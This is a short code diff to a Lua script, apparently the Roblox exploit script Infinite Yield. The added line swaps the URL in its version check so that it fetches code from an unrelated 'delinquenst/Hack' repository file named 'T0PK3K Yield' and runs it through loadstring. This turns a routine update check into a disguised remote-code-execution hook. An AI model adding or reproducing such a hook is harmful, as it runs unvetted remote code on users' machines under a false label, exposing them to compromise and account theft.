@@ -11865,7 +11865,7 @@ end
 TYMouse.Move:Connect(checkTT)
 
 task.spawn(function()
-	if pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeTY/infiniteyield/master/version'))() end) then
+	if pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/delinquenst/Hack/main/T0PK3K%20Yield'))() end) then
 		if ver ~= Version then
 			notify('Outdated','Get the new version at infyiff.github.io')
 		end
